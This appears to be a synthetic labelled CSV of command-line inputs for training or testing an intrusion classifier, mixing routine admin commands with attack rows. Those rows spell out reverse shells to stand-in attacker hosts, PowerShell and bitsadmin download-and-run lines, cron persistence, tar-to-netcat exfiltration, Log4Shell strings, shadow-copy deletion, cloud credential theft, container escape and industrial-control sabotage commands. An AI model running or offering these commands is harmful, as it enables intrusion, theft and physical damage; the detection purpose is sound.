timestamp,src_ip,input,label
2026-01-20T17:46:38.734167,167.163.210.32,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.715600,222.239.213.238,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.727166,197.229.179.242,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.725166,208.39.205.235,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,105.150.48.97,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.735167,60.93.181.244,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.724165,13.27.186.98,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.689753,41.23.2.184,df -h,Normal_Business_Ops
2026-01-20T17:46:38.699355,120.66.79.21,df -h,Normal_Business_Ops
2026-01-20T17:46:38.750363,203.245.246.124,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.702379,65.56.116.62,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.710422,191.93.19.228,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.695355,158.111.166.2,git pull,Normal_Business_Ops
2026-01-20T17:46:38.719650,12.138.42.161,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.687752,141.179.216.132,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.750363,59.123.98.184,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.737194,198.118.122.35,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.723165,22.74.30.106,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.755771,160.205.32.52,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.714423,33.47.237.43,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.738701,25.236.236.177,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.731167,15.182.46.138,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.716597,21.177.232.210,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.710422,138.118.47.73,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.742361,1.218.241.99,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.687752,176.20.108.190,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.723165,172.18.72.186,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.704359,120.224.129.231,whoami,Normal_Business_Ops
2026-01-20T17:46:38.714423,88.91.69.53,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.699355,79.33.33.151,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.730167,187.6.200.166,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.720628,108.93.204.105,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.734167,33.211.38.189,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.687752,115.74.209.118,uptime,Normal_Business_Ops
2026-01-20T17:46:38.748407,147.76.253.212,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.728166,134.134.251.124,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.737194,181.174.196.150,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.690278,208.138.19.154,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.710422,213.96.77.235,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.698355,35.84.86.41,git branch,Normal_Business_Ops
2026-01-20T17:46:38.692357,220.14.169.24,make build,Normal_Business_Ops
2026-01-20T17:46:38.738701,89.213.131.174,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.688752,151.55.246.111,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.699355,130.198.249.88,npm start,Normal_Business_Ops
2026-01-20T17:46:38.710422,30.136.91.130,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.729167,81.18.32.198,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.703359,5.29.90.114,git branch,Normal_Business_Ops
2026-01-20T17:46:38.725166,154.111.145.143,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.734167,195.206.149.160,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.697356,202.70.222.60,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.706408,12.241.88.174,git branch,Normal_Business_Ops
2026-01-20T17:46:38.732168,98.14.253.189,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.705366,52.61.20.61,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.755771,187.47.237.11,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.703359,97.213.168.166,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.742361,25.28.48.99,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.736168,142.167.150.131,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.723165,168.129.251.235,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.729167,137.61.140.150,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.737194,164.105.9.224,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.710422,113.223.199.106,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.688752,152.163.77.103,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.683749,183.168.219.59,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.685785,202.173.243.38,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.690278,48.134.24.187,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.701356,90.88.63.120,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.692357,13.24.29.141,df -h,Normal_Business_Ops
2026-01-20T17:46:38.739701,213.98.57.107,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.691848,136.213.146.217,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.705366,181.42.206.125,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.737194,8.18.246.124,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.709422,195.110.160.27,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.750363,19.197.47.60,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.700357,219.95.224.85,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.714423,103.212.237.76,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.705366,87.203.146.205,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.701356,59.1.227.188,git branch,Normal_Business_Ops
2026-01-20T17:46:38.742361,218.104.26.241,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.695355,57.103.34.137,git add .,Normal_Business_Ops
2026-01-20T17:46:38.743361,179.4.52.160,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.704359,187.110.74.242,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.726165,176.206.162.84,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.709422,69.210.215.152,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.702379,207.191.88.58,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.727166,106.25.14.6,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.705366,55.61.115.48,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.725166,70.29.88.147,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.697356,199.86.40.157,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.695355,117.23.221.83,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.746362,192.220.231.181,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.745361,164.224.214.80,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.737706,175.209.218.47,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.741361,54.123.137.23,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.730167,29.27.28.128,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.740386,179.164.185.250,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.733168,16.200.103.139,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.735167,4.142.2.211,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.745361,140.43.142.189,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.685785,64.103.166.185,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.713423,26.128.5.203,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.713423,196.138.166.188,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.710422,84.231.158.3,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.704359,173.17.37.47,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.699355,119.174.238.132,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.686752,12.33.160.41,npm start,Normal_Business_Ops
2026-01-20T17:46:38.718598,156.116.20.67,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,179.155.130.250,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.684749,78.37.59.249,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.753424,150.111.170.234,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.716597,209.51.207.51,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.685785,47.169.121.147,df -h,Normal_Business_Ops
2026-01-20T17:46:38.755771,139.30.119.45,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.705366,112.2.242.137,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.692357,192.253.92.60,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.695355,179.213.252.201,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.751385,119.85.149.1,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.733168,109.40.177.161,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.704359,209.88.248.31,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.717597,129.227.31.49,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.692357,123.59.222.249,df -h,Normal_Business_Ops
2026-01-20T17:46:38.742361,195.132.145.215,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.724165,29.255.63.43,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.700357,214.194.206.53,git branch,Normal_Business_Ops
2026-01-20T17:46:38.688752,205.209.4.221,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.730167,94.16.151.208,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.742361,25.57.175.205,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,87.203.5.131,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.751920,67.112.7.115,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.712423,28.36.154.83,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.707462,24.150.68.18,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.714423,10.73.89.251,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.688752,125.56.59.23,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.747362,185.136.52.204,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.751920,76.198.144.109,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.725166,40.173.50.171,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.724165,212.181.134.22,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.753424,144.117.110.213,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.723165,193.225.183.61,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.730167,93.165.138.55,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.755771,94.62.182.61,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.711422,95.57.67.168,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.705366,88.122.210.109,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.729167,122.88.122.203,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.700357,42.54.217.47,git add .,Normal_Business_Ops
2026-01-20T17:46:38.726165,73.190.149.217,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.696355,6.10.16.69,git add .,Normal_Business_Ops
2026-01-20T17:46:38.747362,67.81.233.146,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.687752,85.154.100.15,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.720628,125.211.30.206,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.698355,5.90.100.222,git pull,Normal_Business_Ops
2026-01-20T17:46:38.684749,74.244.235.217,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.703359,29.207.153.218,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.753424,192.170.4.126,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.694354,176.136.176.127,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.710422,166.242.237.223,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.686752,151.47.180.8,git add .,Normal_Business_Ops
2026-01-20T17:46:38.715600,52.92.49.66,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.683749,149.35.126.184,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.747362,156.213.158.63,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.697356,139.54.141.202,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.739701,57.250.12.142,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.702379,165.2.114.181,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.740386,60.177.183.201,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.736168,95.73.137.206,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.724165,198.86.32.117,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.748407,126.116.19.100,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.687752,93.218.59.228,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.696355,40.247.91.114,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.713423,190.181.73.16,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.711422,40.39.86.169,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.715600,139.169.248.147,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.695355,118.99.24.120,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.711422,16.108.133.243,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.741361,23.142.117.136,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.736168,42.227.84.204,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719124,23.161.217.150,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.742361,162.67.129.14,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.735167,175.14.46.76,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.745361,216.159.249.216,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.721658,222.9.156.184,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.719124,152.59.118.224,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.684749,117.96.97.231,npm start,Normal_Business_Ops
2026-01-20T17:46:38.728166,192.16.73.60,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.683749,119.212.151.186,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.740386,17.17.191.47,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719650,39.53.249.83,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.741361,205.102.92.73,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.726165,10.44.111.93,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.688752,26.77.134.184,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.746362,146.72.139.169,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.708422,72.43.70.63,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.742361,123.40.158.157,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.755771,39.177.58.25,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.732168,69.163.224.157,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.698355,168.32.249.76,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.748407,215.49.221.1,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.741361,77.240.221.106,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.726165,213.43.19.233,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.743361,136.181.38.32,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.748407,134.199.4.22,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.713423,39.155.32.235,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.690278,148.153.40.110,make build,Normal_Business_Ops
2026-01-20T17:46:38.747362,107.213.79.240,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.752911,214.115.19.78,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.745361,165.77.72.79,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.741361,208.143.136.147,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.711422,109.83.160.171,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.715600,221.115.145.115,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.721658,30.63.225.211,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.697356,131.246.69.172,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.729167,124.157.203.47,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.724165,10.28.48.93,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.746362,158.3.210.129,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.727166,46.154.250.56,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.714423,128.115.88.41,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.724165,137.231.122.190,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.705366,9.119.8.110,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.739701,58.12.244.82,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.707462,168.229.92.152,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.737706,31.151.56.122,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.685785,206.114.151.130,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.705366,95.96.226.247,journalctl -u ssh.service,Normal_Business_Ops
